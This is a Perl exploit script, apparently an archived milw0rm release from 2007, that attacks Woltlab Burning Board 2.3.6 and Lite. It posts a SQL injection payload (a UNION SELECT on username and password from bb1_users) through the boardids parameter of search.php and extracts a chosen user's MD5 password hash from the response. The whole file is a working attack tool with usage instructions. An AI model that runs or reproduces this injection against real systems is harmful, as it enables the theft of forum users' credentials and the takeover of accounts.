#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Response;

$| = 1;
print "
###################################################
##
## Woltlab Burning Board 2.3.6 <= / Lite Exploit 
##
###################################################
##
## Coded by 666 <http://blueshisha.mutebox.net>
## Bug by trew
##
###################################################
\n";

if($#ARGV < 0)
{
        print "[x] Usage: wbbsploit.pl [Target] [Userid] [Searchstring]\n";
        exit;
}
print "<~> Exploiting...\n";
my $url = shift;
my $id = shift;
my $sstring = shift;

my $ua = LWP::UserAgent->new;
my $request = new HTTP::Request('POST', 'http://'.$url.'search.php');
$request->content('searchuser=&name_exactly=1&topiconly=0&showposts=0&searchdate=0&beforeafter=after&sortby=lastpost&sortorder=desc&send=send&sid=&submit=Suchen&boardids%5B%5D=1)%20UNION%20SELECT%20username,password%20FROM%20bb1_users%20WHERE%20userid='.$id.'/*&searchstring='.$sstring.'');
$request->content_type('application/x-www-form-urlencoded');
my $response = $ua->request($request);
my $body     = $response->content;
print "<~> Hash: ";
$body=~/([a-f0-9]{32})/;
print $1;
print "\n";

# milw0rm.com [2007-01-17]
